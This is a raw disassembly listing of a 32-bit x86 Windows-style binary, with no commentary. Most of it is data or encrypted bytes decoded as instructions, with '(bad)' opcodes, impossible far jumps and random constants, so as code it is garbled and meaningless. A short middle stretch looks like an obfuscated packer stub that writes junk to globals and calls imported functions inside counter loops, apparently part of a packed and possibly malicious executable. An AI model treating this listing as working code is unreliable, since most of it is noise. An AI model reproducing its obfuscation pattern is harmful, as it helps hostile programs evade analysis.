  40d2d9:	sub    DWORD PTR [ecx+eiz*4-0x58c90667],0x70
  40d2e1:	mov    ah,BYTE PTR [eax-0x40]
  40d2e4:	cld    
  40d2e5:	adc    ebx,esp
  40d2e7:	pop    esi
  40d2e8:	lods   eax,DWORD PTR ds:[esi]
  40d2e9:	lea    ecx,[ecx+0x4c]
  40d2ec:	xchg   BYTE PTR [edx],dh
  40d2ee:	jmp    0x81d0:0x5bb4a6f9
  40d2f5:	mov    bl,0x25
  40d2f7:	jno    0x40d34d
  40d2f9:	pusha  
  40d2fa:	mov    ds:0xdc9f8960,al
  40d2ff:	leave  
  40d300:	data16 and BYTE PTR [edx],bh
  40d303:	add    BYTE PTR [ebx],cl
  40d305:	jecxz  0x40d341
  40d307:	mov    cl,0xb0
  40d309:	jg     0x40d302
  40d30b:	clc    
  40d30c:	(bad)  
  40d30d:	and    BYTE PTR [ecx-0x4835ab50],ch
  40d313:	fs cmp al,0x80
  40d316:	dec    esp
  40d317:	jae    0x40d367
  40d319:	rcr    edi,cl
  40d31b:	sub    cl,BYTE PTR [esp+ebx*1]
  40d31e:	fnstsw WORD PTR [eax]
  40d320:	aad    0x50
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	and    eax,0xb0c5be73
  40d33d:	xchg   edi,eax
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	arpl   ax,sp
  40d346:	fcmovu st,st(3)
  40d348:	stc    
  40d349:	(bad)  
  40d34b:	xchg   bh,dl
  40d34d:	xchg   ebp,eax
  40d34e:	stos   DWORD PTR es:[edi],eax
  40d34f:	mov    esp,0x8215a166
  40d354:	xor    BYTE PTR [edi-0x30],dh
  40d357:	test   bh,0x37
  40d35a:	xor    al,0x92
  40d35c:	mov    eax,0x291a5f6d
  40d361:	iret   
  40d362:	fadd   st(2),st
  40d364:	or     ah,dl
  40d366:	mov    ah,0x87
  40d368:	cmp    al,0x39
  40d36a:	aam    0x36
  40d36c:	push   eax
  40d36e:	pushf  
  40d36f:	xor    BYTE PTR [eax+0x6d88f31f],bh
  40d375:	adc    eax,0x5d916829
  40d37a:	(bad)  
  40d37c:	icebp  
  40d37d:	test   eax,0x112c6842
  40d382:	mov    eax,ds:0x6fe65ec1
  40d387:	jle    0x40d35f
  40d389:	aam    0x74
  40d38b:	jg     0x40d3e4
  40d38d:	int3   
  40d38e:	jo     0x40d373
  40d390:	dec    eax
  40d391:	call   0xa3af:0x4fddacd4
  40d398:	mov    eax,ds:0xf1db11d9
  40d39d:	dec    ebp
  40d39e:	imul   edx,DWORD PTR [esi+0x51],0x1d
  40d3a2:	cmc    
  40d3a3:	jge    0x40d3bf
  40d3a5:	and    esi,DWORD PTR [edx+ebp*2+0x1729af9]
  40d3ac:	push   ss
  40d3ad:	xchg   DWORD PTR [eax+0x45c53a5],ebp
  40d3b3:	call   0xa110:0x5f8b1807
  40d3ba:	sub    al,0x9f
  40d3bc:	jmp    0x8906:0xd2fadeec
  40d3c3:	inc    eax
  40d3c4:	push   edx
  40d3c5:	repz (bad) 
  40d3c8:	jns    0x40d36d
  40d3ca:	push   0xffffff8f
  40d3cc:	inc    edi
  40d3cd:	loopne 0x40d3bd
  40d3cf:	and    DWORD PTR [edx+0x29],ebx
  40d3d2:	je     0x40d446
  40d3d4:	cmp    al,0xbf
  40d3d6:	xchg   ecx,eax
  40d3d7:	mov    eax,0x12a504cf
  40d3dc:	or     dh,BYTE PTR [edx-0x20]
  40d3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e0:	callw  0x9e6a
  40d3e4:	cs call 0xe17736e0
  40d3ea:	mov    dl,bh
  40d3ec:	add    DWORD PTR [edi],ecx
  40d3ee:	and    cl,BYTE PTR [eax+0x7a1c541b]
  40d3f4:	sub    eax,0x6059ac9a
  40d3f9:	jb     0x40d397
  40d3fb:	sub    esp,DWORD PTR [edx]
  40d3fd:	fdivr  QWORD PTR [ebp-0x4]
  40d400:	or     BYTE PTR [ebx-0x5f],cl
  40d403:	xor    BYTE PTR [esp+edi*8+0x32],dh
  40d407:	push   0xfffffffb
  40d409:	fwait
  40d40a:	adc    BYTE PTR [ebp-0x6f78d00d],dh
  40d410:	(bad)  
  40d411:	ja     0x40d48f
  40d413:	repnz xor ebp,DWORD PTR [eax+0x7a]
  40d417:	lods   al,BYTE PTR ds:[esi]
  40d418:	mov    esi,0xd16b8c2c
  40d41d:	mov    ebx,0x558610d7
  40d422:	das    
  40d423:	stos   DWORD PTR es:[edi],eax
  40d424:	pop    eax
  40d425:	outs   dx,BYTE PTR ds:[esi]
  40d426:	call   0xed67:0xff1558dc
  40d42d:	xor    eax,0xa925313a
  40d432:	mov    dh,0x6f
  40d434:	popf   
  40d435:	stos   BYTE PTR es:[edi],al
  40d436:	jo     0x40d44c
  40d438:	dec    ebp
  40d439:	imul   ebx,DWORD PTR [edx],0x2
  40d43c:	inc    edi
  40d43d:	in     eax,0xef
  40d43f:	xor    al,0xce
  40d441:	ror    DWORD PTR ds:0x93867c13,1
  40d447:	int    0x7f
  40d449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44a:	inc    eax
  40d44b:	out    dx,al
  40d44c:	xor    DWORD PTR [ebx+0x57ac2ca],edx
  40d452:	lods   al,BYTE PTR ds:[esi]
  40d453:	ret    
  40d454:	stc    
  40d455:	xor    al,0x28
  40d457:	jmp    0xfbb6:0x881bc816
  40d45e:	jle    0x40d46c
  40d460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d461:	(bad)  
  40d462:	or     al,0xea
  40d464:	pusha  
  40d465:	adc    dl,BYTE PTR [esi-0x320885b8]
  40d46b:	xchg   esi,eax
  40d46c:	xor    bh,BYTE PTR [ebx-0x189e7667]
  40d472:	inc    ecx
  40d473:	loop   0x40d4a7
  40d475:	mov    dl,0x53
  40d477:	xchg   esp,eax
  40d478:	mov    dl,0xb7
  40d47a:	(bad)  
  40d47b:	jo     0x40d4fa
  40d47d:	cwde   
  40d47e:	gs loop 0x40d473
  40d481:	out    0xb2,eax
  40d483:	mov    al,0x82
  40d485:	pop    es
  40d486:	adc    esp,DWORD PTR [ebx+0x50ea2350]
  40d48c:	push   edi
  40d48d:	or     ebx,DWORD PTR [edi-0x4fb913e1]
  40d493:	(bad)  
  40d495:	repz in eax,dx
  40d497:	jmp    0xe53d:0xcc45c7f1
  40d49e:	mov    edx,DWORD PTR [esi-0x74]
  40d4a1:	(bad)  
  40d4a3:	xor    al,0x9a
  40d4a5:	sbb    eax,0x63d4630c
  40d4aa:	lock adc edi,DWORD PTR [ebx-0x7c61f529]
  40d4b1:	clc    
  40d4b2:	mov    cl,0x49
  40d4b4:	cli    
  40d4b5:	lds    ecx,FWORD PTR [ecx]
  40d4b7:	call   0xa1a6:0xe478ab07
  40d4be:	adc    al,0x2c
  40d4c0:	or     al,BYTE PTR [eax]
  40d4c2:	sahf   
  40d4c3:	xor    BYTE PTR [edi],0x95
  40d4c6:	adc    BYTE PTR [ebx+0x7dbc39bf],al
  40d4cc:	and    ch,BYTE PTR [ecx+0x47d25d1b]
  40d4d2:	pop    esi
  40d4d3:	cdq    
  40d4d4:	lea    ebx,[ecx-0x5]
  40d4d7:	js     0x40d494
  40d4d9:	popf   
  40d4da:	mov    dh,0x7d
  40d4dc:	jmp    0x40d506
  40d4de:	(bad)  
  40d4df:	adc    DWORD PTR [ecx+0x19fcc386],edi
  40d4e5:	and    bh,al
  40d4e7:	call   0x51f5:0xbc1e436c
  40d4ee:	adc    BYTE PTR [ebx+edx*2],al
  40d4f1:	cmp    al,BYTE PTR [edx+eiz*4+0x13]
  40d4f5:	mov    edx,0x231234b5
  40d4fa:	rcr    DWORD PTR [ecx],cl
  40d4fc:	lea    ecx,[edi]
  40d4fe:	mov    ecx,0x5dc08945
  40d503:	or     edx,edx
  40d505:	cmc    
  40d506:	pop    edx
  40d507:	mov    al,ds:0x5455e38d
  40d50c:	push   ss
  40d50d:	and    eax,0x1022001b
  40d512:	mov    BYTE PTR [eax+ebx*8-0x36],ah
  40d516:	jmp    0x40d52f
  40d518:	and    esp,edi
  40d51a:	dec    edi
  40d51b:	icebp  
  40d51c:	retf   
  40d51d:	pop    ebp
  40d51e:	stos   BYTE PTR es:[edi],al
  40d51f:	(bad)  
  40d520:	push   cs
  40d521:	pop    es
  40d522:	loopne 0x40d546
  40d524:	push   es
  40d525:	pop    eax
  40d526:	mov    DWORD PTR [esi+0x2626601a],esp
  40d52c:	jnp    0x40d4c5
  40d52e:	xchg   esp,eax
  40d52f:	mov    al,0x8
  40d531:	mov    bl,0xd7
  40d533:	mov    eax,0x65765328
  40d538:	loop   0x40d54d
  40d53a:	inc    DWORD PTR [edi]
  40d53c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d53d:	sbb    BYTE PTR [edx],0x38
  40d540:	inc    ecx
  40d541:	or     ah,BYTE PTR [ebx]
  40d543:	loope  0x40d4f4
  40d545:	pop    esi
  40d546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d547:	jg     0x40d578
  40d549:	push   edi
  40d54a:	in     al,0xf9
  40d54c:	test   BYTE PTR [ebp-0x78f1a922],0xe
  40d553:	push   edi
  40d554:	xchg   edi,eax
  40d555:	mov    ebp,DWORD PTR [edi]
  40d557:	mov    bh,0x8d
  40d559:	jno    0x40d4ee
  40d55b:	jo     0x40d4ed
  40d55d:	icebp  
  40d55e:	(bad)  
  40d55f:	cmp    esp,DWORD PTR [eax+0x5]
  40d562:	aaa    
  40d563:	mov    cl,0x81
  40d565:	cmp    dl,ch
  40d567:	addr16 enter 0x4e74,0x87
  40d56c:	test   BYTE PTR [eax],dh
  40d56e:	out    0xc3,eax
  40d570:	dec    edi
  40d571:	cmp    ebp,DWORD PTR [esi-0x31e6675b]
  40d577:	call   DWORD PTR [ebx-0x8]
  40d57a:	emms   
  40d57c:	stc    
  40d57d:	(bad)  
  40d57e:	dec    esi
  40d57f:	pushf  
  40d580:	inc    edx
  40d581:	sbb    al,0x1b
  40d583:	fild   DWORD PTR [esp+ebx*4]
  40d586:	adc    DWORD PTR [edx-0x23],esp
  40d589:	push   ds
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x9fa0482a
  40d6f9:	jmp    0x40d697
  40d6fb:	mov    eax,ds:0x7e7e927a
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d69d
  40d705:	cmp    dh,dh
  40d707:	pop    ds
  40d708:	rcr    BYTE PTR [edx-0x7e33a8ef],0x83
  40d70f:	pop    eax
  40d710:	arpl   WORD PTR [edx],cx
  40d712:	retf   
  40d713:	mov    bh,0xa6
  40d715:	mov    eax,0x4cbeced1
  40d71a:	into   
  40d71b:	mov    eax,0x41e97ebf
  40d720:	sbb    esp,DWORD PTR [edx]
  40d722:	mov    bl,0xd
  40d724:	sbb    eax,0xd93e191
  40d729:	call   0x6df7432b
  40d72e:	call   0xbcba:0x8746e33c
  40d735:	inc    edx
  40d736:	mov    ebp,0x52492cb
  40d73b:	idiv   DWORD PTR [esi+0x76e7b28d]
  40d741:	mov    ecx,edi
  40d743:	sbb    eax,0x84c7407
  40d748:	add    eax,0xbab6367b
  40d74d:	rol    BYTE PTR [edx+0x1db92d60],1
  40d753:	cdq    
  40d754:	enter  0xd90f,0x35
  40d758:	mov    WORD PTR [ebx+0x35],ss
  40d75b:	xchg   esi,eax
  40d75c:	pop    edi
  40d75d:	bound  esi,QWORD PTR [ebp-0xc]
  40d760:	sbb    DWORD PTR [edi],esp
  40d762:	loop   0x40d6f8
  40d764:	scas   al,BYTE PTR es:[edi]
  40d765:	jge    0x40d7a2
  40d767:	(bad)  
  40d768:	pop    esi
  40d769:	or     DWORD PTR [ebp-0x1a5dbea4],ebp
  40d76f:	inc    esi
  40d770:	jl     0x40d71e
  40d772:	mov    DWORD PTR [edi-0x4c199f65],ebp
  40d778:	sbb    eax,0xd8ff7536
  40d77d:	add    esi,DWORD PTR [edx]
  40d77f:	jge    0x40d7ae
  40d781:	call   0x678a:0x58ad91c7
  40d788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d789:	or     eax,0x9b3d3efa
  40d78e:	je     0x40d762
  40d790:	dec    ebp
  40d791:	popa   
  40d792:	icebp  
  40d793:	xchg   DWORD PTR [ecx+0x72ee6ba0],ebx
  40d799:	inc    ebp
  40d79a:	popf   
  40d79b:	add    BYTE PTR ds:0x86fa4de7,0x8b
  40d7a2:	arpl   bx,si
  40d7a4:	mov    ds:0xdd39b3e7,eax
  40d7a9:	mov    esp,0x86e5961f
  40d7ae:	xlat   BYTE PTR ds:[ebx]
  40d7af:	retf   0x273a
  40d7b2:	jmp    0x40d803
  40d7b4:	jecxz  0x40d7f8
  40d7b6:	inc    esp
  40d7b7:	outs   dx,BYTE PTR ds:[esi]
  40d7b8:	(bad)  
  40d7b9:	sbb    al,0xe7
  40d7bb:	mov    edi,0xd3722439
  40d7c0:	add    DWORD PTR [edx+0x44042f64],ecx
  40d7c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7c7:	cs mov edx,0x7e3f5b23
  40d7cd:	mov    cs,WORD PTR [ecx+0x4c52c6ea]
  40d7d3:	push   ss
  40d7d4:	icebp  
  40d7d5:	inc    edx
  40d7d6:	and    BYTE PTR [eax],0x90
  40d7d9:	shl    ebp,1
  40d7db:	mov    esp,ecx
  40d7dd:	rcr    DWORD PTR [edx+0x64],1
  40d7e0:	out    dx,al
  40d7e1:	add    al,bh
  40d7e3:	fcomp  QWORD PTR [ecx-0x3491ed05]
  40d7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ea:	ja     0x40d7c0
  40d7ec:	xor    al,0xc8
  40d7ee:	adc    esp,DWORD PTR [ecx]
  40d7f0:	ret    0xc358
  40d7f3:	outs   dx,DWORD PTR ds:[esi]
  40d7f4:	xchg   ecx,eax
  40d7f5:	xor    esp,DWORD PTR [ecx+0x6d618ea]
  40d7fb:	xchg   ebx,eax
  40d7fc:	outs   dx,BYTE PTR ds:[esi]
  40d7fd:	adc    BYTE PTR [eax+esi*8],ch
  40d800:	(bad)  
  40d801:	pop    ss
  40d802:	sbb    BYTE PTR [ebp+0x10],dl
  40d805:	cmp    al,0x15
  40d807:	mov    edx,0xb022e133
  40d80c:	pop    es
  40d80d:	addr16 std 
  40d80f:	add    ah,BYTE PTR [edi+esi*4]
  40d812:	mov    ebp,eax
  40d814:	(bad)  
  40d816:	xor    edx,DWORD PTR [esi+ecx*8]
  40d819:	xchg   ebx,eax
  40d81a:	fmul   st,st(1)
  40d81c:	xor    DWORD PTR [ecx-0x3b],edx
  40d81f:	jge    0x40d801
  40d821:	mov    al,ds:0x92954c3c
  40d826:	jp     0x40d818
  40d828:	inc    eax
  40d829:	in     eax,dx
  40d82a:	push   0xffffffd9
  40d82c:	nop
  40d82d:	mov    esi,ecx
  40d82f:	jge    0x4ec8c0fc
  40d835:	clc    
  40d836:	nop
  40d837:	ret    
  40d838:	test   DWORD PTR [esi-0x4eaadc84],0xbf6dc631
  40d842:	dec    ecx
  40d843:	imul   eax
  40d845:	sar    BYTE PTR [esp+eiz*4+0x7530f665],cl
  40d84c:	pusha  
  40d84d:	and    al,BYTE PTR [ecx+0x68a396ed]
  40d853:	jo     0x40d876
  40d855:	outs   dx,BYTE PTR ds:[esi]
  40d856:	and    bh,bh
  40d858:	push   esp
  40d859:	push   ds
  40d85a:	mov    esp,0x7d4378f2
  40d85f:	hlt    
  40d860:	lods   al,BYTE PTR ds:[esi]
  40d861:	xor    BYTE PTR [ecx-0x6a0217d],al
  40d867:	cmp    cl,BYTE PTR [edi]
  40d869:	xor    DWORD PTR [edi],ecx
  40d86b:	sub    eax,0x4336f0b6
  40d870:	push   0x69
  40d872:	and    DWORD PTR [edi+0x79],edx
  40d875:	add    al,0xa3
  40d877:	and    BYTE PTR [ebx+0x9],0xaa
  40d87b:	mov    ecx,0x346a495e
  40d880:	jle    0x40d818
  40d882:	mov    bh,bl
  40d884:	(bad)  
  40d885:	dec    ebp
  40d886:	mov    ebp,0xbe65f830
  40d88b:	jo     0x40d830
  40d88d:	jne    0x40d870
  40d88f:	jno    0x40d865
  40d891:	sbb    DWORD PTR [eax-0x65],0x29
  40d895:	xchg   edx,eax
  40d896:	jae    0x40d826
  40d898:	hlt    
  40d899:	push   edi
  40d89a:	push   edx
  40d89b:	push   0xa3cad07
  40d8a0:	iret   
  40d8a1:	xor    cl,al
  40d8a3:	push   esp
  40d8a4:	aad    0x4d
  40d8a6:	iret   
  40d8a7:	push   0xa58fa491
  40d8ac:	adc    al,0x92
  40d8ae:	jecxz  0x40d91b
  40d8b0:	stc    
  40d8b1:	adc    BYTE PTR [edi-0x644a29c0],cl
  40d8b7:	or     BYTE PTR [eax-0x3c],bl
  40d8ba:	outs   dx,BYTE PTR ds:[esi]
  40d8bb:	scas   al,BYTE PTR es:[edi]
  40d8bc:	out    dx,al
  40d8bd:	cmp    BYTE PTR [edi-0x49],bl
  40d8c0:	jg     0x40d8df
  40d8c2:	imul   edx,DWORD PTR [esi-0x70e7c0e8],0xffffffb3
  40d8c9:	mov    ?,ebp
  40d8cb:	cli    
  40d8cc:	pop    ebp
  40d8cd:	push   ecx
  40d8ce:	adc    BYTE PTR fs:[ebx+0x4ccc30cc],bh
  40d8d5:	pop    ebx
  40d8d6:	frstor [ecx+0x31f9a34d]
  40d8dc:	add    esp,ebp
  40d8de:	sbb    ebx,ebx
  40d8e0:	pcmpeqd mm0,QWORD PTR [ecx-0x55]
  40d8e4:	and    edx,DWORD PTR [eax-0x24106bb6]
  40d8ea:	popf   
  40d8eb:	arpl   WORD PTR [esi],bp
  40d8ed:	(bad)  
  40d8ee:	pop    edi
  40d8ef:	stos   DWORD PTR es:[edi],eax
  40d8f0:	xor    al,0xc5
  40d8f2:	or     BYTE PTR [eax],ch
  40d8f4:	dec    esp
  40d8f5:	mov    ecx,0x918075ee
  40d8fa:	and    ebp,edx
  40d8fc:	cmp    esp,DWORD PTR [esi+0x55090b54]
  40d902:	pop    esp
  40d903:	and    ch,BYTE PTR [ecx+0x20]
  40d906:	mov    eax,0x9a564db8
  40d90b:	pop    ss
  40d90c:	adc    ecx,eax
  40d90e:	rcr    bl,cl
  40d910:	push   ecx
  40d911:	mov    ds,WORD PTR [ecx-0x38]
  40d914:	cli    
  40d915:	test   eax,0x2c77bac8
  40d91a:	cmp    eax,0x221d4947
  40d91f:	aaa    
  40d920:	mov    edi,esi
  40d922:	mov    bh,0x70
  40d924:	scas   al,BYTE PTR es:[edi]
  40d925:	adc    DWORD PTR [ebx],edi
  40d927:	cwde   
  40d928:	and    ch,ah
  40d92a:	imul   BYTE PTR [ecx]
  40d92c:	ja     0x40d980
  40d92e:	sub    al,0x17
  40d930:	lea    esi,[ebx-0x4d]
  40d933:	mov    ecx,DWORD PTR [ebp-0x4011ee2e]
  40d939:	in     eax,0xf7
  40d93b:	mov    dh,0xf8
  40d93d:	fs aas 
  40d93f:	mov    ah,0x2c
  40d941:	fld    st(6)
  40d943:	test   eax,0x458b0189
  40d948:	clc    
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xdd2b51ed
  40d96a:	fwait
  40d96b:	adc    eax,0x7e903a9d
  40d970:	jle    0x40d9b0
  40d972:	jl     0x40d9f2
  40d974:	jle    0x40d8f8
  40d976:	xchg   ebp,eax
  40d977:	iret   
  40d978:	pushf  
  40d979:	mov    ch,0xb4
  40d97b:	fstp   QWORD PTR [eax]
  40d97d:	popf   
  40d97e:	rcl    DWORD PTR [edx-0x1f765e68],0xc1
  40d985:	(bad)  
  40d986:	bound  eax,QWORD PTR [ebp+0x38]
  40d989:	pop    eax
  40d98a:	hlt    
  40d98b:	mov    esp,0xfbdb76e
  40d990:	cmc    
  40d991:	mov    bh,0xe0
  40d993:	jp     0x40d98b
  40d995:	push   0xfe6e8e5f
  40d99a:	adc    ebx,DWORD PTR [ebp+0x2c]
  40d99d:	fs dec esp
  40d99f:	popf   
  40d9a0:	(bad)  
  40d9a1:	push   edx
  40d9a2:	dec    eax
  40d9a3:	inc    ecx
  40d9a4:	sub    BYTE PTR [edi+0xd],0xfa
  40d9a8:	and    DWORD PTR [eax],edx
  40d9aa:	stos   DWORD PTR es:[edi],eax
  40d9ab:	ret    
  40d9ac:	jne    0x40d9bc
  40d9ae:	xchg   ecx,eax
  40d9af:	lock mov esp,0xd0eeea95
  40d9b5:	fdivp  st(4),st
  40d9b7:	and    dh,BYTE PTR [edi+edi*2+0x177cd379]
  40d9be:	stos   BYTE PTR es:[edi],al
  40d9bf:	out    dx,al
  40d9c0:	test   BYTE PTR [edi+0x1df4c1d4],al
  40d9c6:	aam    0x26
  40d9c8:	ss frstor es:[edi+0x35]
  40d9cd:	int    0xc2
  40d9cf:	mov    al,ds:0xf7572d0f
  40d9d4:	cmp    eax,0x36058ed7
  40d9d9:	xchg   dl,dl
  40d9db:	xchg   ebp,eax
  40d9dc:	int    0x12
  40d9de:	cmp    ah,BYTE PTR [edx+0xe2df808]
  40d9e4:	push   esp
  40d9e5:	mov    ch,0xfb
  40d9e7:	sub    eax,DWORD PTR [ecx]
  40d9e9:	fyl2xp1 
  40d9eb:	sbb    DWORD PTR [esi+edi*8-0x2],edx
  40d9ef:	js     0x40d9a3
  40d9f1:	pushf  
  40d9f2:	inc    ecx
  40d9f3:	aam    0xd8
  40d9f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9f6:	inc    ebp
  40d9f7:	mov    dh,0x41
  40d9f9:	loope  0x40d99a
  40d9fb:	fdivr  st,st(4)
  40d9fd:	cmp    al,0xc6
  40d9ff:	cmp    bl,cl
  40da01:	sbb    DWORD PTR [ebx-0x20],ecx
  40da04:	pop    es
  40da05:	add    eax,0xb267047e
  40da0a:	jb     0x40d99c
  40da0c:	aas    
  40da0d:	mov    eax,DWORD PTR [ebp-0x4c569cf5]
  40da13:	inc    edx
  40da14:	jge    0x40da5d
  40da16:	pop    eax
  40da17:	rol    BYTE PTR [esi+esi*2],cl
  40da1a:	pop    esi
  40da1b:	(bad)  
  40da1c:	out    dx,al
  40da1d:	cmp    al,0x9f
  40da1f:	retf   0x2295
  40da22:	jecxz  0x40d9a5
  40da24:	cmc    
  40da25:	push   edx
  40da26:	xchg   edx,eax
  40da27:	and    DWORD PTR [ebx+edi*1+0xb],ebx
  40da2b:	xchg   edi,eax
  40da2c:	int    0x13
  40da2e:	es clc 
  40da30:	ja     0x40da58
  40da32:	fs mov dl,0x53
  40da35:	add    BYTE PTR [esi+ecx*2+0x4e391174],bl
  40da3c:	adc    DWORD PTR [ebx],0x22
  40da3f:	mov    ds:0x66fcd55a,al
  40da44:	sahf   
  40da45:	mov    cl,0x23
  40da47:	test   eax,0xa54bb894
  40da4c:	xor    bl,BYTE PTR ds:0x17f5a9e8
  40da52:	les    edx,FWORD PTR [edx+0x6f]
  40da55:	jle    0x40da4a
  40da57:	xchg   esi,eax
  40da58:	stc    
  40da59:	shr    BYTE PTR [ebx-0x48fbf305],1
  40da5f:	fimul  WORD PTR [esi-0x4d6ecbeb]
  40da65:	or     BYTE PTR [esi],0xf8
  40da68:	jnp    0x40da1a
  40da6a:	arpl   WORD PTR [ebx+eax*2],sp
  40da6d:	mov    eax,DWORD PTR [ecx-0x6d9de047]
  40da73:	loop   0x40dac9
  40da75:	sti    
  40da76:	into   
  40da77:	popa   
  40da78:	and    edi,DWORD PTR [edi+ebp*4-0xfbfee63]
  40da7f:	xor    BYTE PTR [ebp+0x38eabf18],0x66
  40da86:	scas   al,BYTE PTR es:[edi]
  40da87:	cmp    eax,0x11c228f1
  40da8c:	cs lock jle 0x40da91
  40da90:	ja     0x40dabd
  40da92:	stos   BYTE PTR es:[edi],al
  40da93:	das    
  40da94:	test   eax,0x939d71d0
  40da99:	in     al,0x1c
  40da9b:	sub    BYTE PTR [edi+0x60],bl
  40da9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9f:	xchg   ebx,eax
  40daa0:	jmp    0x8b3706a6
  40daa5:	lods   eax,DWORD PTR ds:[esi]
  40daa6:	sub    DWORD PTR [esi-0x7f],edx
  40daa9:	das    
  40daaa:	in     al,dx
  40daab:	in     eax,dx
  40daac:	lods   al,BYTE PTR ds:[esi]
  40daad:	cwde   
  40daae:	xchg   esi,eax
  40daaf:	leave  
  40dab0:	into   
  40dab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab2:	repnz pop ss
  40dab4:	mov    dl,0xeb
  40dab6:	cmp    dh,BYTE PTR ds:0xafce7b29
  40dabc:	fadd   st(3),st
  40dabe:	iret   
  40dabf:	add    dl,BYTE PTR [eax+0x2f348f79]
  40dac5:	mov    esi,0xd2c8492d
  40daca:	sub    BYTE PTR [esi+0x1b],al
  40dacd:	loop   0x40dad3
  40dacf:	xor    eax,0x4c71c53a
  40dad4:	and    DWORD PTR [ecx+0x63ca564c],ebp
  40dada:	cmp    bh,dl
  40dadc:	cli    
  40dadd:	adc    dl,BYTE PTR [edi]
  40dadf:	aaa    
  40dae0:	xor    ebx,DWORD PTR [edx]
  40dae2:	mov    dh,0x4
  40dae4:	pop    esi
  40dae5:	daa    
  40dae6:	js     0x40da82
  40dae8:	jae    0x40dab5
  40daea:	push   ebx
  40daeb:	pop    esi
  40daec:	and    dh,BYTE PTR [edx+edx*4+0x39]
  40daf0:	push   ecx
  40daf1:	clc    
  40daf2:	push   eax
  40daf3:	fs cwde 
  40daf5:	mov    ebx,0xe38aa59e
